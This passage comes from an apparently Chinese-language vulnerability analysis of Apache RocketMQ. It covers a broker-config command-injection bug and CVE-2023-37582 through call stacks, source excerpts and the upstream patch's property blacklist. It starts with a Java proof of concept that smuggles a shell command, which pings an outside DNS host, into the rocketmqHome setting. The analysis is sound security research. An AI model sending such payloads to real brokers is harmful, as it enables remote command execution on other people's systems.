class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String targetAddr = <span class="string">&quot;127.0.0.1:10911&quot;</span>;</span><br><span class="line">        Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">        props.setProperty(<span class="string">&quot;rocketmqHome&quot;</span>, getCmd(<span class="string">&quot;ping -c1 r.1.dns.m0d9.me&quot;</span>));</span><br><span class="line">        props.setProperty(<span class="string">&quot;filterServerNums&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        DefaultMQAdminExt admin = <span class="keyword">new</span> DefaultMQAdminExt();</span><br><span class="line">        admin.setNamesrvAddr(<span class="string">&quot;127.0.0.1:9876&quot;</span>);</span><br><span class="line">        admin.start();</span><br><span class="line">        admin.updateBrokerConfig(targetAddr, props);</span><br><span class="line">        Properties brokerConfig = admin.getBrokerConfig(targetAddr);</span><br><span class="line">        System.out.println(brokerConfig.getProperty(<span class="string">&quot;rocketmqHome&quot;</span>));</span><br><span class="line">        System.out.println(brokerConfig.getProperty(<span class="string">&quot;filterServerNums&quot;</span>));</span><br><span class="line">        admin.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-3-漏洞分析"><a href="#1-3-漏洞分析" class="headerlink" title="1.3 漏洞分析"></a>1.3 漏洞分析</h2><p>总共涉及到3个线程</p><ol><li>netty server到 NettyRequestProcessor#processRequest(ChannelHandlerContext ctx, RemotingCommand cmd)，其中cmd是网络传输Decode 所得</li><li>AdminBrokerProcessor更新brokerController.brokerConfig，其中有个属性rocketmqHome</li><li>有个周期线程FilterServerManager，会用到rocketmqHome 拼接成命令</li></ol><p>具体如下</p><h3 id="1-3-1-Netty-gt-NettyRequestProcessor"><a href="#1-3-1-Netty-gt-NettyRequestProcessor" class="headerlink" title="1.3.1 Netty -&gt; NettyRequestProcessor"></a>1.3.1 Netty -&gt; NettyRequestProcessor</h3><p>调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">processRequestCommand:261, NettyRemotingAbstract (org.apache.rocketmq.remoting.netty)</span><br><span class="line">processMessageReceived:169, NettyRemotingAbstract (org.apache.rocketmq.remoting.netty)</span><br><span class="line">channelRead0:540, NettyRemotingServer$NettyServerHandler (org.apache.rocketmq.remoting.netty)</span><br><span class="line">channelRead0:532, NettyRemotingServer$NettyServerHandler (org.apache.rocketmq.remoting.netty)</span><br><span class="line">channelRead:99, SimpleChannelInboundHandler (io.netty.channel)</span><br><span class="line">invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:286, IdleStateHandler (io.netty.handler.timeout)</span><br><span class="line">invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:57, RemotingCodeDistributionHandler (org.apache.rocketmq.remoting.netty)</span><br><span class="line">invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:324, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">channelRead:296, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:365, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:357, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead0:528, NettyRemotingServer$HandshakeHandler (org.apache.rocketmq.remoting.netty)</span><br><span class="line">channelRead0:475, NettyRemotingServer$HandshakeHandler (org.apache.rocketmq.remoting.netty)</span><br><span class="line">channelRead:99, SimpleChannelInboundHandler (io.netty.channel)</span><br><span class="line">invokeChannelRead:379, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">access$600:61, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">run:370, AbstractChannelHandlerContext$7 (io.netty.channel)</span><br><span class="line">run:66, DefaultEventExecutor (io.netty.util.concurrent)</span><br><span class="line">run:989, SingleThreadEventExecutor$4 (io.netty.util.concurrent)</span><br><span class="line">run:74, ThreadExecutorMap$2 (io.netty.util.internal)</span><br><span class="line">run:833, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>其逻辑如下</p><h4 id="1-NettyServerHandler"><a href="#1-NettyServerHandler" class="headerlink" title="1. NettyServerHandler"></a>1. NettyServerHandler</h4><pre><code>NettyServerServer#NettyServerHandler 继承了Netty SimpleChannelInboundHandler 接口</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NettyServerHandler</span> <span class="keyword">extends</span> <span class="title">SimpleChannelInboundHandler</span>&lt;<span class="title">RemotingCommand</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">channelRead0</span><span class="params">(ChannelHandlerContext ctx, RemotingCommand msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> localPort = RemotingHelper.parseSocketAddressPort(ctx.channel().localAddress());</span><br><span class="line">        NettyRemotingAbstract remotingAbstract = NettyRemotingServer.<span class="keyword">this</span>.remotingServerTable.get(localPort);</span><br><span class="line">        <span class="keyword">if</span> (localPort != -<span class="number">1</span> &amp;&amp; remotingAbstract != <span class="keyword">null</span>) &#123;</span><br><span class="line">            remotingAbstract.processMessageReceived(ctx, msg);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// The related remoting server has been shutdown, so close the connected channel</span></span><br><span class="line">        RemotingHelper.closeChannel(ctx.channel());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>具体逻辑在NettyRemotingAbstract.pprocessMessageReceived，NettyRemotingAbstract 有4个实现类</p><ul><li><p>NettyRemotingClient</p></li><li><p>NettyRemotingServer</p></li><li><p>MultiProtocolRemotingServer，也是继承的NettyRemotingServer</p></li><li><p>NettyRemotingServer#SubRemotingServer</p><blockquote><p>Tip: 泛型RemotingCommand 是如何实现的？具体实现是NettyDecoder</p></blockquote><p>  NettyRemotingServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ChannelPipeline <span class="title">configChannel</span><span class="params">(SocketChannel ch)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ch.pipeline()</span><br><span class="line">        .addLast(defaultEventExecutorGroup, HANDSHAKE_HANDLER_NAME, handshakeHandler)</span><br><span class="line">        .addLast(defaultEventExecutorGroup,</span><br><span class="line">            encoder,</span><br><span class="line">            <span class="keyword">new</span> NettyDecoder(),</span><br><span class="line">            distributionHandler,</span><br><span class="line">            <span class="keyword">new</span> IdleStateHandler(<span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                nettyServerConfig.getServerChannelMaxIdleTimeSeconds()),</span><br><span class="line">            connectionManageHandler,</span><br><span class="line">            serverHandler</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>  NettyDecoder</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    ByteBuf frame = <span class="keyword">null</span>;</span><br><span class="line">    Stopwatch timer = Stopwatch.createStarted();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        frame = (ByteBuf) <span class="keyword">super</span>.decode(ctx, in);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == frame) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        RemotingCommand cmd = RemotingCommand.decode(frame);</span><br><span class="line">        cmd.setProcessTimer(timer);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;decode exception, &quot;</span> + RemotingHelper.parseChannelRemoteAddr(ctx.channel()), e);</span><br><span class="line">        RemotingHelper.closeChannel(ctx.channel());</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> != frame) &#123;</span><br><span class="line">            frame.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-NettyRemotingAbstract-processMessageReceived，逻辑如下"><a href="#2-NettyRemotingAbstract-processMessageReceived，逻辑如下" class="headerlink" title="2. NettyRemotingAbstract#processMessageReceived，逻辑如下"></a>2. NettyRemotingAbstract#processMessageReceived，逻辑如下</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processMessageReceived</span><span class="params">(ChannelHandlerContext ctx, RemotingCommand msg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (msg.getType()) &#123;</span><br><span class="line">            <span class="keyword">case</span> REQUEST_COMMAND:</span><br><span class="line">                processRequestCommand(ctx, msg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RESPONSE_COMMAND:</span><br><span class="line">                processResponseCommand(ctx, msg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-processRequestCommand"><a href="#3-processRequestCommand" class="headerlink" title="3. processRequestCommand"></a>3. processRequestCommand</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processRequestCommand</span><span class="params">(<span class="keyword">final</span> ChannelHandlerContext ctx, <span class="keyword">final</span> RemotingCommand cmd)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">final</span> Pair&lt;NettyRequestProcessor, ExecutorService&gt; matched = <span class="keyword">this</span>.processorTable.get(cmd.getCode());</span><br><span class="line">      <span class="keyword">final</span> Pair&lt;NettyRequestProcessor, ExecutorService&gt; pair = <span class="keyword">null</span> == matched ? <span class="keyword">this</span>.defaultRequestProcessorPair : matched;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">int</span> opaque = cmd.getOpaque();</span><br><span class="line">...</span><br><span class="line">      Runnable run = buildProcessRequestHandler(ctx, cmd, pair, opaque);</span><br><span class="line">...</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">final</span> RequestTask requestTask = <span class="keyword">new</span> RequestTask(run, ctx.channel(), cmd);</span><br><span class="line">          <span class="comment">//async execute task, current thread return directly</span></span><br><span class="line">          pair.getObject2().submit(requestTask);</span><br></pre></td></tr></table></figure><ul><li>最终调用ExecutorService.submit(requestTask) 实现进程派生</li></ul></li></ul><h4 id="4-RequestTask-run"><a href="#4-RequestTask-run" class="headerlink" title="4. RequestTask#run"></a>4. RequestTask#run</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RequestTask</span><span class="params">(<span class="keyword">final</span> Runnable runnable, <span class="keyword">final</span> Channel channel, <span class="keyword">final</span> RemotingCommand request)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.runnable = runnable;</span><br><span class="line">    <span class="keyword">this</span>.channel = channel;</span><br><span class="line">    <span class="keyword">this</span>.request = request;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.stopRun)</span><br><span class="line">        <span class="keyword">this</span>.runnable.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>- 所以逻辑是在buildProcessRequestHandler 内</code></pre><h4 id="5-NettyRemotingAbstract-buildProcessRequestHandler"><a href="#5-NettyRemotingAbstract-buildProcessRequestHandler" class="headerlink" title="5. NettyRemotingAbstract#buildProcessRequestHandler"></a>5. NettyRemotingAbstract#buildProcessRequestHandler</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Runnable <span class="title">buildProcessRequestHandler</span><span class="params">(ChannelHandlerContext ctx, RemotingCommand cmd,</span></span></span><br><span class="line"><span class="function"><span class="params">    Pair&lt;NettyRequestProcessor, ExecutorService&gt; pair, <span class="keyword">int</span> opaque)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> () -&gt; &#123;</span><br><span class="line">        Exception exception = <span class="keyword">null</span>;</span><br><span class="line">        RemotingCommand response;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">            <span class="keyword">if</span> (exception == <span class="keyword">null</span>) &#123;</span><br><span class="line">                response = pair.getObject1().processRequest(ctx, cmd);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>- 具体逻辑在NettyRequestProcessor#processRequest</code></pre><h4 id="6-NettyRequestProcessor-processRequest"><a href="#6-NettyRequestProcessor-processRequest" class="headerlink" title="6. NettyRequestProcessor#processRequest"></a>6. NettyRequestProcessor#processRequest</h4><p>  NettyRequestProcessor有很多实现</p><ul><li>AdminBrokerProcessor</li><li>AbstractSendMessageProcessor</li><li>AckMessageProcessor</li><li>AdminBrokerProcessor</li><li>ChangeInvisibleTimeProcessor</li><li>…</li></ul><h3 id="1-3-2-AdminBrokerProcessor更新brokerController-brokerConfig"><a href="#1-3-2-AdminBrokerProcessor更新brokerController-brokerConfig" class="headerlink" title="1.3.2 AdminBrokerProcessor更新brokerController.brokerConfig"></a>1.3.2 AdminBrokerProcessor更新brokerController.brokerConfig</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">setRocketmqHome:776, BrokerConfig (org.apache.rocketmq.common)</span><br><span class="line">invokeVirtual:-1, DirectMethodHandle$Holder (java.lang.invoke)</span><br><span class="line">invoke:-1, LambdaForm$MH&#x2F;0x0000000800c80c00 (java.lang.invoke)</span><br><span class="line">invokeExact_MT:-1, Invokers$Holder (java.lang.invoke)</span><br><span class="line">invokeImpl:155, DirectMethodHandleAccessor (jdk.internal.reflect)</span><br><span class="line">invoke:104, DirectMethodHandleAccessor (jdk.internal.reflect)</span><br><span class="line">invoke:577, Method (java.lang.reflect)</span><br><span class="line">properties2Object:378, MixAll (org.apache.rocketmq.common)</span><br><span class="line">update:189, Configuration (org.apache.rocketmq.remoting)</span><br><span class="line">updateBrokerConfig:778, AdminBrokerProcessor (org.apache.rocketmq.broker.processor)</span><br><span class="line">processRequest:216, AdminBrokerProcessor (org.apache.rocketmq.broker.processor)</span><br><span class="line">lambda$buildProcessRequestHandler$1:312, NettyRemotingAbstract (org.apache.rocketmq.remoting.netty)</span><br><span class="line">run:-1, NettyRemotingAbstract$$Lambda$218&#x2F;0x0000000800fbbcb8 (org.apache.rocketmq.remoting.netty)</span><br><span class="line">run:80, RequestTask (org.apache.rocketmq.remoting.netty)</span><br><span class="line">call:539, Executors$RunnableAdapter (java.util.concurrent)</span><br><span class="line">run:264, FutureTask (java.util.concurrent)</span><br><span class="line">runWorker:1136, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:635, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:833, Thread (java.lang)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-674.png" alt="upload successful"></p><h4 id="Invoke"><a href="#Invoke" class="headerlink" title="Invoke"></a>Invoke</h4><p>注意这里的invoke MixAll</p><ul><li>properties2Object</li></ul><p>实际上，也就这些属性能被update</p><p><img src="/images/pasted-849.png" alt="upload successful"></p><h3 id="1-3-3-周期任务FilterServerManager"><a href="#1-3-3-周期任务FilterServerManager" class="headerlink" title="1.3.3 周期任务FilterServerManager"></a>1.3.3 周期任务FilterServerManager</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">callShell:25, FilterServerUtil (org.apache.rocketmq.broker.filtersrv)</span><br><span class="line">createFilterServer:74, FilterServerManager (org.apache.rocketmq.broker.filtersrv)</span><br><span class="line">run0:61, FilterServerManager$1 (org.apache.rocketmq.broker.filtersrv)</span><br><span class="line">run:43, AbstractBrokerRunnable (org.apache.rocketmq.common)</span><br><span class="line">call:539, Executors$RunnableAdapter (java.util.concurrent)</span><br><span class="line">runAndReset:305, FutureTask (java.util.concurrent)</span><br><span class="line">run:305, ScheduledThreadPoolExecutor$ScheduledFutureTask (java.util.concurrent)</span><br><span class="line">runWorker:1136, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:635, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:833, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>注意FilterServerManager 的构造函数BrokerController 有final修饰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FilterServerManager</span><span class="params">(<span class="keyword">final</span> BrokerController brokerController)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.brokerController = brokerController;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BrokerController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">BrokerController</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">final</span> BrokerConfig brokerConfig,</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">final</span> NettyServerConfig nettyServerConfig,</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">final</span> NettyClientConfig nettyClientConfig,</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">final</span> MessageStoreConfig messageStoreConfig</span></span></span><br><span class="line"><span class="function"><span class="params">   )</span> </span>&#123;</span><br><span class="line">           <span class="keyword">this</span>.filterServerManager = <span class="keyword">new</span> FilterServerManager(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">initialize</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">   ...</span><br><span class="line">           registerProcessor();</span><br><span class="line">       ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerProcessor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">       AdminBrokerProcessor adminProcessor = <span class="keyword">new</span> AdminBrokerProcessor(<span class="keyword">this</span>);</span><br><span class="line">...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>BrokerStartup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BrokerController <span class="title">createBrokerController</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        BrokerController controller = buildBrokerController(args);</span><br><span class="line">        <span class="keyword">boolean</span> initResult = controller.initialize();</span><br></pre></td></tr></table></figure><p>大致的工作流程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BrokerStartup</span><br><span class="line">BrokerController</span><br><span class="line">    NettyRemotingServer</span><br><span class="line">        NettyServerHandler#channelRead0</span><br><span class="line">            NettyRemotingAbstract#processMessageReceived</span><br><span class="line">                NettyRemotingAbstract#processRequestCommand</span><br><span class="line">                    NettyRemotingAbstract#buildProcessRequestHandler</span><br><span class="line">                        AdminBrokerProcessor#processRequest</span><br><span class="line">                            AdminBrokerProcessor#updateBrokerConfig  </span><br><span class="line">        NettyRemotingClient</span><br></pre></td></tr></table></figure><h1 id="0x02-CVE-2023-37582"><a href="#0x02-CVE-2023-37582" class="headerlink" title="0x02 CVE-2023-37582"></a>0x02 CVE-2023-37582</h1><h2 id="2-1-POC"><a href="#2-1-POC" class="headerlink" title="2.1 POC"></a>2.1 POC</h2><p>参考【4】</p><h2 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h2><p>和命令执行类似，不过只有两层</p><ol><li>第一层一样</li><li>第二层用的DefaultRequestProcessor，其UPDATE_NAMESRV_CONFIG 功能updateConfig 可以修改配置文件，其中文件名和文件内容都可自定义</li></ol><h3 id="2-2-1-Netty-Server-gt-NettyRequestProcessor"><a href="#2-2-1-Netty-Server-gt-NettyRequestProcessor" class="headerlink" title="2.2.1 Netty Server -&gt; NettyRequestProcessor"></a>2.2.1 Netty Server -&gt; NettyRequestProcessor</h3><p>与RCE漏洞类似</p><h3 id="2-2-2-UPDATE-NAMESRV-CONFIG"><a href="#2-2-2-UPDATE-NAMESRV-CONFIG" class="headerlink" title="2.2.2 UPDATE_NAMESRV_CONFIG"></a>2.2.2 UPDATE_NAMESRV_CONFIG</h3><p>调用栈如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">update:202, Configuration (org.apache.rocketmq.remoting)</span><br><span class="line">updateConfig:630, DefaultRequestProcessor (org.apache.rocketmq.namesrv.processor)</span><br><span class="line">processRequest:132, DefaultRequestProcessor (org.apache.rocketmq.namesrv.processor)</span><br><span class="line">lambda$buildProcessRequestHandler$1:312, NettyRemotingAbstract (org.apache.rocketmq.remoting.netty)</span><br><span class="line">run:-1, NettyRemotingAbstract$$Lambda$182&#x2F;0x0000000800e5b580 (org.apache.rocketmq.remoting.netty)</span><br><span class="line">run:80, RequestTask (org.apache.rocketmq.remoting.netty)</span><br><span class="line">call:539, Executors$RunnableAdapter (java.util.concurrent)</span><br><span class="line">run:264, FutureTask (java.util.concurrent)</span><br><span class="line">runWorker:1136, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:635, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:833, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>其中 properties2Object 对Configuration#configObjectList 通过invoke方式进行覆盖，其中就有configStorePath，对应getStorePath的路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Object configObject : configObjectList) &#123;</span><br><span class="line">    <span class="comment">// not allConfigs to update...</span></span><br><span class="line">    MixAll.properties2Object(properties, configObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Invoke-1"><a href="#Invoke-1" class="headerlink" title="Invoke"></a>Invoke</h4><p>注意这里的invoke MixAll</p><ul><li>properties2Object</li></ul><p>实际上，也就这些属性能被update</p><p><img src="/images/pasted-848.png" alt="upload successful"></p><h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><h3 id="3-1-patch1"><a href="#3-1-patch1" class="headerlink" title="3.1 patch1"></a>3.1 patch1</h3><p><a href="https://github.com/apache/rocketmq/pull/6733/files">https://github.com/apache/rocketmq/pull/6733/files</a></p><p>在NettyRequestProcessor 的实现类上新增了几个属性黑名单</p><ul><li>broker.processor.AdminBrokerProcessor#brokerConfigPath</li><li>controller.processor.ControllerRequestProcessor#configStorePath</li><li>namesrv.processor.DefaultRequestProcessor#kvConfigPath</li><li>namesrv.processor.DefaultRequestProcessor#configStorePathName</li></ul><p><img src="/images/pasted-844.png" alt="upload successful"><br><img src="/images/pasted-845.png" alt="upload successful"><br><img src="/images/pasted-846.png" alt="upload successful"></p><h3 id="3-2-patch2"><a 